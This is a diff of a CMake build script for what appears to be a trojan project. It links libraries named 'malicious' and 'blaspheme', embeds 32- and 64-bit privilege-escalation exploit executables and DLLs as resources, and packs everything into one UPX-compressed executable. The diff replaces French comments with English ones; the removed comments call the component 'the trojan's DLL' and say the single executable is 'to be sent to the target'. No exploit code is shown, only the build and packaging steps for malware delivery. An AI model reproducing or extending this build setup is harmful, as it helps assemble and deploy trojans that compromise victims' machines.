@@ -2,8 +2,7 @@ file(GLOB_RECURSE substrate_source_files substrate/*.hpp substrate/*.cpp)
 add_library(substrate SHARED ${substrate_source_files})
 target_link_libraries(substrate system network blaspheme malicious common userenv)
 
-# Le generateur de ressource va créer des headers a partir de fichiers binaires afin
-# de ne produire qu'un seul executable final a envoyer a la cible
+# ressource generator will create headers with binary resources
 set(BINGENERATOR "${CMAKE_SOURCE_DIR}/utils/bin2array.exe")
 set(COMPRESSOR "${CMAKE_SOURCE_DIR}/utils/upx.exe")
 
@@ -39,7 +38,6 @@ message(STATUS "ELEVATOR64_EXE_PATH = ${ELEVATOR64_EXE_PATH}")
 message(STATUS "ELEVATORDLL64_HPP_PATH = ${ELEVATORDLL64_HPP_PATH}")
 message(STATUS "ELEVATORDLL64_DLL_PATH = ${ELEVATORDLL64_DLL_PATH}")
 
-# La DLL du trojan
 add_custom_command(
 	TARGET substrate
 	POST_BUILD
@@ -50,7 +48,7 @@ add_custom_command(
 file(GLOB_RECURSE inhibitor_source_files inhibitor/*)
 add_executable(inhibitor WIN32 ${inhibitor_source_files})
 
-# L'exploit de privilege escalation en 32 bit
+# generation of privilege escalation executable 32bit
 add_custom_command(
 	TARGET inhibitor
 	PRE_BUILD
@@ -58,7 +56,7 @@ add_custom_command(
 	COMMENT "Generating ${ELEVATOR_HPP32_PATH} WITH ${ELEVATOR32_EXE_PATH}"
 )
 
-# La DLL de privilege escalation en 32 bit
+# generation of privilege escalation DLL 32bit
 add_custom_command(
 	TARGET inhibitor
 	PRE_BUILD
@@ -66,7 +64,7 @@ add_custom_command(
 	COMMENT "Generating ${ELEVATORDLL32_HPP_PATH} WITH ${ELEVATORDLL32_DLL_PATH}"
 )
 
-# L'exploit de privilege escalation en 64 bit
+# generation of privilege escalation executable 64bit
 add_custom_command(
 	TARGET inhibitor
 	PRE_BUILD
@@ -74,7 +72,7 @@ add_custom_command(
 	COMMENT "Generating ${ELEVATOR64_HPP_PATH} WITH ${ELEVATOR64_EXE_PATH}"
 )
 
-# La DLL de privilege escalation en 64 bit
+# generation of privilege escalation DLL 64bit
 add_custom_command(
 	TARGET inhibitor
 	PRE_BUILD
@@ -82,12 +80,13 @@ add_custom_command(
 	COMMENT "Generating ${ELEVATORDLL64_HPP_PATH} WITH ${ELEVATORDLL64_DLL_PATH}"
 )
 
-# substrate est dans liste car il DOIT etre construit avant inhibitor
+# substrate has to be built before inhibitor, because of resource inclusion
 target_link_libraries(inhibitor common malicious system network substrate shlwapi)
 install(TARGETS inhibitor RUNTIME DESTINATION innocence)
 
+# UPX Compression
 #if ( CMAKE_BUILD_TYPE MATCHES Debug)
-#	message(STATUS "Compression desactivee.")
+#	message(STATUS "Compressing disabled")
 #elseif( CMAKE_BUILD_TYPE MATCHES Release)
 #	if(WIN32)
 #		message(STATUS "Compression activee sur ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}")
